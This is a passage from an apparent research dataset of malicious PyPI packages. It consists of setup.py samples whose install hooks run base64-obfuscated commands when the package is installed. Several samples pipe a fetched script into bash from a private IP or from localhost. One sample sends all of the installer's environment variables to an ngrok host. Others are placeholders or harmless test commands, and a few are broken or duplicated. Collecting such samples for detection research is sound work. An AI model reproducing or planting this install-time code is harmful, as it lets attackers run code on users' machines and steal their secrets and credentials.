= setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tiny433-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Rlc3QudHh0IHwgYmFzaAo=\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"tiny433\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tinyad-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"CODE_REPLACE\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"tinyad\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tinyad1-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAgLXMgaHR0cDovL2xvY2FsaG9zdDo4MDAwL3Jldi5zaCB8IGJhc2gK\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"tinyad1\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tinyad2-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Jldi5zaCB8IGJhc2gK\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"tinyad2\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-14-hamburgesr-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaAo=\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"hamburgesr\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-22-advpruebitaa-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"dHlwZSBudWwgPiBwcnVlYmExMS50eHQKZGly\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"advpruebitaa\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-22-advpruebitaa3-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"dHlwZSBudWwgPiBwcnVlYmExMS50eHQKZGly\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"advpruebitaa3\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=2.0\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-22-advpruebitaa4-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"dHlwZSBudWwgPiBwcnVlYmExMS50eHQ=\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"advpruebitaa4\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=2.0\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-22-advpruebitaa6-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\nos.system(\"dir\")\nopen(\"pruebita22.txt\", \"w\")\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"advpruebitaa6\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=2.0\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-22-advpruebitaa8-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\nos.system(\"dir\")\nopen(\"pruebita22.txt\", \"w\")\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nsetuptools.setup(\n    name = \"advpruebitaa8\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=2.0\",\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-23-advpruebitaa9-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"dHlwZSBudWwgPiBwcnVlYmEzMy50eHQ=\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"advpruebitaa9\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-15-virus-muerto-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"virus_muerto\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-11-lab-3-package-438d82fc-v0.1.2",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport socket\n\ndef notmalfunc():\n    # Extract environment variables\n    data = dict(os.environ)\n    data_str = \"\\n\".join([f\"{k}: {v}\" for k, v in data.items()])\n    \n    # Connect to ngrok-exposed Netcat listener\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('2.tcp.eu.ngrok.io', 19382))  # Replace with the correct ngrok address and port\n        sock.sendall(data_str.encode())\n        sock.close()\n    except Exception as e:\n        print(f\"Error connecting to the server: {e}\")\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"lab-3-package-438d82fc\",\n    version = \"0.1.2\",  # Increment the version number\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\ndef hello():\n    print(\"Hello, World!\")\n\n\ndef hello():\n    print(\"Hello, World!\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-14-gasmanez-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\nimport hashlib\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d('''CODE_REPLACE\n\n\n\n\n\n\n\n\n\n\n\n'''))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"gasmanez\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"sadgosling@gmail.com\",\n    description = \"Special library\",\n    long_description = \"Special library\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-14-pycryptexe-v1.1.4",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\nimport subprocess\n\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"pycryptexe\",\n    version = \"1.1.4\",\n    author = \"JungleBrothers\",\n    author_email = \"junglebrothers@gmail.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/junglebrothers/pycryptexe\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/junglebrothers/pycryptexe/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-13-hansont-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"CODE_REPLACE\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"hansont\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-13-youhans-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(\"CODE_REPLACE\")\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"youhans\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-15-mecit2-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"CODE_REPLACE\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"mecit2\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\nimport setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"CODE_REPLACE\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"PACKAGE_NAME\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-15-mecit3-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"CODE_REPLACE\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"mecit3\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n\n\nimport setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"CODE_REPLACE\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"PACKAGE_NAME\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        